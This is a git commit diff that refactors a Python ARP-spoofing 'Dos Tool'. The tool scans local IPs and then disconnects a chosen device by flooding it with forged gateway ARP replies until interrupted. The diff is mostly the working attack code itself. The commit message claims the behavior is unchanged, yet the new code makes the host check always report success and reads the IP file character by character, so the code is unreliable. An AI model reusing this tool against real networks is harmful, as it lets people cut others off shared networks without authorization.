7b64c761896dae4df188b5a4d7de7a6315ed60ec
Noémie <102274923+Name-shitty-github-profile@users.noreply.github.com>
2022-10-22 04:15:13 +0200

    Update Network-Manager.py
    Massive code improvement (work the same as before)

--- Network-Manager.py
+++ Network-Manager.py
@@ -8,42 +8,36 @@ from getmac import *
 import netifaces
 
 
-__licence__ = "Code created by catcha80#2887 Discord: https://discord.gg/uYbkPB7qZV  Github: https://github.com/catcha8"
+__licence__ = "Code created by catcha80#2887 and forked by Noémie Discord: https://discord.gg/uYbkPB7qZV  Github: https://github.com/catcha8"
 
 def get_ip():
-    host = socket.gethostname()
-    ip = socket.gethostbyname(host) 
-    return ip
+    return socket.gethostbyname(socket.gethostname()) 
 
-def is_up(line : str):
-
-    port = 80
-
+def is_up(line: str) -> bool:
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(1)
-
-        addr = (line, port)
+        addr = (line, 80)
         check = sock.connect_ex(addr)
         sock.close()
-
-        return not check
+        return True
     except:
         return False
 
-def spoof(target_ip, gateway_ip, mac_adress):
-    packet = Ether(dst = mac_adress) / ARP(op = 1, pdst = target_ip, psrc = gateway_ip) 
-    sendp(packet)	
+def spoof(target_ip, gateway_ip, mac_adress) -> None:
+    packet = Ether(dst = mac_adress) / ARP(op = 1, pdst = target_ip, psrc = gateway_ip)
+    sendp(packet)
+    return None
 
 
 def scan_ip():
     global list
 
-    file = Write.Input("Drag a file with all ip adress ('/' in the file path must be remplaced by '\\'): ", Colors.red_to_blue, interval=0.005)  
-    file1 = open(file, 'r')
-
-    list = ""
-    count = 0
+    file = Write.Input("Drag a file with all ip adress ('/' in the file path must be remplaced by '\\'): ", Colors.red_to_blue, interval=0.005)
+    with open(file, 'r') as f:
+      file1: str = f.read()
+    list: str = ""
+    count: int = 0
     for line in file1:
         count += 1
 
@@ -51,29 +45,21 @@ def scan_ip():
 
         if is_up(line.strip()):
             list += "\n" + line.strip()
-
-    file1.close()
     Write.Input(f"Scan ended, this is the list of the connected IP\n {list}", Colors.red_to_blue, interval=0.005)
 
 
-def cut_connection():
-    IP = Write.Input(f"Input the IP that you want to cut his connection fromn this list: \n {list}\n(Press CTRL + C to cancel poisoning)\n\n>", Colors.red_to_blue, interval=0.005)
-    ip_mac = get_mac_address(ip=IP)
-
-    gws = netifaces.gateways()
-    gateway_ip = gws['default'][netifaces.AF_INET][0]
-
+def cut_connection() -> None:
+    IP = Write.Input(f"Input the IP that you want to cut their connection fromn this list: \n {list}\n(Press CTRL + C to cancel poisoning)\n\n>", Colors.red_to_blue, interval=0.005)
     try:
         sent_packets_count = 0
         while True:
-            spoof(IP, gateway_ip, ip_mac)
-            sent_packets_count = sent_packets_count + 1
-            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
+            spoof(IP, netifaces.gateways()['default'][netifaces.AF_INET][0], get_mac_address(ip=IP))
+            sent_packets_count += 1
+            print("\r[*] Packets Sent " + str(sent_packets_count), end ="")
             time.sleep(0.2)
-
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
-        print("[+] Arp Spoof Stopped")    
+        print("[+] Arp Spoof Stopped")
 
 System.Title("Dos Tool catcha8 Github: https://github.com/catcha8")
 
@@ -100,9 +86,9 @@ banner = """
 888       888 "Y888888 888  888 "Y888888  "Y88888  "Y8888  888      
                                               888                   
                                          Y8b d88P                   
-                                          "Y88P"                from catcha80#2887
-                                                                Discord : https://discord.gg/uYbkPB7qZV
-                                                                Github  : https://github.com/catcha8
+                                          "Y88P"                from catcha80#2887 forked by Noémie
+                                                                Discord : https://discord.gg/XuhQWQav7F
+                                                                Github  : https://github.com/name-shitty-github-profile
                                                                                                                                                                                                  
 """[1:]
 
@@ -112,20 +98,18 @@ print("\n"*2)
 print(Colorate.Diagonal(Colors.yellow_to_green, Center.XCenter(banner)))
 print("\n"*5)    
 
-def main():
+def main() -> None:
     global choix
     choix = int(Write.Input("Choose an option: \n 1: Scan all my privates ip\n 2: Disconnect anyone in the list, you have to scan first\n 3: Exit\n > ", Colors.blue_to_green, interval=0.005))
-
-    if (choix == 1):
+    if choix == 1:
         scan_ip()
-    elif (choix == 2 and list != ""):
+    elif choix == 2 and list != "":
         cut_connection()
     else:
-        return
+        return None
 
 
 choix = 1
 list  = ""
 
-while True and (choix == 1 or choix == 2):
-    main()
+while True and choix in [1, 2]: main()
